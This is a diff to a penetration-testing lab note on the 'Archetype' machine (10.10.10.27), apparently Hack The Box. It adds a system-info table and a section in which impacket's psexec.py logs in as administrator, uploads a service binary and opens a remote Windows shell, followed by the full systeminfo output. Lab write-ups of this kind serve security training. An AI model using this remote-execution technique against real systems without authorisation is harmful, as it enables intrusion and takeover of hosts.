@@ -1,5 +1,15 @@
 # Archetype (10.10.10.27) Recon
 [[archetype (10.10.10.27)]]
+## Summary
+### System Info
+| System Attribute | Value                                  |
+| ---------------- | -------------------------------------- |
+| OS Name          | Microsoft Windows Server 2019 Standard |
+| OS Version       | 10.0.17763 N/A Build 17763             |
+| Archtechture     | x64                                    |
+| RAM              | 2,047 MB                               |
+| Host Type        | VMware Virtual Machine                 |
+| Nics             | vmxnet3 (10.10.10.27)                  | 
 
 | IP          | hostname  | version                                        |
 | ----------- | --------- | ---------------------------------------------- |
@@ -127,3 +137,71 @@
 	Nmap done: 1 IP address (1 host up) scanned in 10.82 seconds
 	```
 	![[Pasted image 20210816135902.png]]
+
+## PS Exec
+1. Login as administrator
+	```
+	tyler@ubuntu:~/Downloads/impacket-0.9.23$ psexec.py administrator@10.10.10.27
+	Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+	Password:
+	[*] Requesting shares on 10.10.10.27.....
+	[*] Found writable share ADMIN$
+	[*] Uploading file WrRmpKGp.exe
+	[*] Opening SVCManager on 10.10.10.27.....
+	[*] Creating service addg on 10.10.10.27.....
+	[*] Starting service addg.....
+	[!] Press help for extra shell commands
+	Microsoft Windows [Version 10.0.17763.107]
+	(c) 2018 Microsoft Corporation. All rights reserved.
+	```
+	![[Pasted image 20210817083720.png]]
+2. systeminfo
+	```
+	C:\Windows\system32>systeminfo
+
+	Host Name:                 ARCHETYPE
+	OS Name:                   Microsoft Windows Server 2019 Standard
+	OS Version:                10.0.17763 N/A Build 17763
+	OS Manufacturer:           Microsoft Corporation
+	OS Configuration:          Standalone Server
+	OS Build Type:             Multiprocessor Free
+	Registered Owner:          Windows User
+	Registered Organization:
+	Product ID:                00429-00521-62775-AA442
+	Original Install Date:     1/19/2020, 11:39:36 PM
+	System Boot Time:          8/17/2021, 8:23:06 AM
+	System Manufacturer:       VMware, Inc.
+	System Model:              VMware7,1
+	System Type:               x64-based PC
+	Processor(s):              1 Processor(s) Installed.
+							   [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+	BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
+	Windows Directory:         C:\Windows
+	System Directory:          C:\Windows\system32
+	Boot Device:               \Device\HarddiskVolume2
+	System Locale:             en-us;English (United States)
+	Input Locale:              en-us;English (United States)
+	Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+	Total Physical Memory:     2,047 MB
+	Available Physical Memory: 1,085 MB
+	Virtual Memory: Max Size:  2,431 MB
+	Virtual Memory: Available: 1,440 MB
+	Virtual Memory: In Use:    991 MB
+	Page File Location(s):     C:\pagefile.sys
+	Domain:                    WORKGROUP
+	Logon Server:              N/A
+	Hotfix(s):                 2 Hotfix(s) Installed.
+							   [01]: KB4532947
+							   [02]: KB4464455
+	Network Card(s):           1 NIC(s) Installed.
+							   [01]: vmxnet3 Ethernet Adapter
+									 Connection Name: Ethernet0 2
+									 DHCP Enabled:    No
+									 IP address(es)
+									 [01]: 10.10.10.27
+									 [02]: fe80::50b7:3ed0:379b:ce58
+									 [03]: dead:beef::50b7:3ed0:379b:ce58
+	Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+	```
+	![[Pasted image 20210817083821.png]]
